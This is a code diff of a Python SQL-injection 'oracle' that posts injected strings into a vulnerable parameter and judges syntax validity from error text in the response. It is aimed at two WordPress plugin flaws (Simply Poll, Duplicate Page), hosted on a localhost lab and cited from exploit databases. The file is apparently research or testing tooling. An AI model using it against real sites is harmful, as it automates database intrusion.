@@ -1,10 +1,10 @@
 #coding:utf-8
 import requests
 import copy
-import time
+import sys
+import ast
 
 ## Model
-
 def http_request(target, injtxt): 
     """send a post request to the target with a supplement to the vulnerable param and return server response"""
     injected_target = copy.deepcopy(target)
@@ -18,19 +18,22 @@ def http_request(target, injtxt):
 
 class HttpTarget:
     """describe a target with an url, method GET/POST, default payload and the vulnerable param."""
-    def __init__(self, url, method, payload, param):
+    def __init__(self, url, method, payload, vulnparam):
         self.url = url                                      # string
         self.method = method                                # GET or POST
         self.payload = payload                              # dict
-        self.vulnparam = param                              # string
+        self.vulnparam = vulnparam                          # string
         self.defaultPage = http_request(self, '').text
 
        
-## Main function    
-def oracle(url, method, payload, param, injtxt):
+## Oracle function    
+def main():
     """return 0 only if injtxt is syntactically valid"""
 
-    target = HttpTarget(url, method, payload, param)
+    url, method, vulnparam, injtxt = sys.argv[1], sys.argv[2], sys.argv[4], sys.argv[5]
+    payload = ast.literal_eval(sys.argv[3])
+    
+    target = HttpTarget(url, method, payload, vulnparam)
     r = http_request(target, injtxt)         
    
     if r.text.find("error")>= 0:    
@@ -41,18 +44,28 @@ def oracle(url, method, payload, param, injtxt):
         return 0 # valid        
     else:
         print("[oracleSQL] not able to determine if \""+injtxt+"\" was undoubtedly invalid ¯\(°_o)/¯") 
-        return 0 # default
+        return 0 # default    
+        
+if __name__ == "__main__":
+    main()        
+    
+
+
     
  
 ## Tests
 # Targets
 #https://www.exploit-db.com/exploits/40971
+#Command line : python sqloracl.py http://localhost/injections/wordp/wp-admin/admin-ajax.php POST {'action':'spAjaxResults','pollid':'2'} pollid [innjtxt]
 simply_poll = HttpTarget("http://localhost/injections/wordp/wp-admin/admin-ajax.php",
                          "POST",
                          {'action':'spAjaxResults','pollid':'2'},
                          "pollid")
+
+
 #https://wpvulndb.com/vulnerabilities/9251
-duplicate_page = HttpTarget("http://localhost/injections/wordp/wp-admin/wp-admin/admin.php?",
+#Command line : python sqloracl.py http://localhost/injections/wordp/wp-admin/wp-admin/admin.php GET {'action':'dt_duplicate_post_as_draft','post':''} post [innjtxt]
+duplicate_page = HttpTarget("http://localhost/injections/wordp/wp-admin/wp-admin/admin.php",
                          "GET",
                          {'action':'dt_duplicate_post_as_draft','post':''},
                          "post")
